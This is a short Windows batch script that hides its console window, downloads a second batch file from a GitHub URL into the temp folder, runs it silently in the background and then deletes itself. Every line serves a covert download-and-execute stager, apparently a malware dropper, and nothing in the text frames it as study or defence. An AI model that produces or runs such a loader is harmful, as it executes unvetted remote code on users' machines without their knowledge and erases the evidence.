@echo off
mode con: cols=10 lines=1 2>nul
cd %temp%
curl -o bat2.bat https://raw.githubusercontent.com/2mwd2024/nb/main/bat2.bat
start /b cmd /c bat2.bat
del "%~f0"
exit
